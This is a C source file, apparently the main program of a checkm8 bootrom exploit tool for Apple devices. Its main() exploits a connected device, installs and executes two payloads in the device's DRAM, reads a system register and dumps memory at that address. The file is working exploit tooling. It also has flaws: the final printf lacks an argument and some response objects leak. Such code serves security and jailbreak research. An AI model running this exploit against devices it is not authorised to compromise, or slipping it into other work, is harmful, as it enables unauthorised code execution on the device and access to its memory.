#include "checkm8.h"
#include "payload.h"

#include <stdio.h>
#include <stdarg.h>
#include <execinfo.h>
#include <command.h>

void checkm8_debug_indent(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    void *traces[100];
    int depth = backtrace(traces, 100) - 5;
    for(int i = 0; i < depth; i++)
    {
        printf("\t");
    }
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void checkm8_debug_block(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}


int main()
{
    int ret;
    struct pwned_device *dev = exploit_device();
    if(dev == NULL || dev->status == DEV_NORMAL)
    {
        printf("Failed to exploit device\n");
        return -1;
    }

    struct dev_cmd_resp *resp;

    install_payload(dev, PAYLOAD_SYNC, DRAM);
    install_payload(dev, PAYLOAD_SYSREG, DRAM);

    resp = execute_payload(dev, PAYLOAD_SYNC, 0);
    printf("payload sync execution got ret %i\n", resp->ret);
    free_dev_cmd_resp(resp);

    resp = execute_payload(dev, PAYLOAD_SYSREG, 0);
    if(resp->ret == CHECKM8_SUCCESS)
    {
        long long evt_base = RESP_VALUE(resp->data, unsigned long long, 0);
        printf("got evt base %llx\n", evt_base);

        resp = read_payload(dev, evt_base, 16);
        printf("%08llX %08llx %08llx",
                RESP_VALUE(resp->data, unsigned long long, 0),
                RESP_VALUE(resp->data, unsigned long long, 1));
    }
}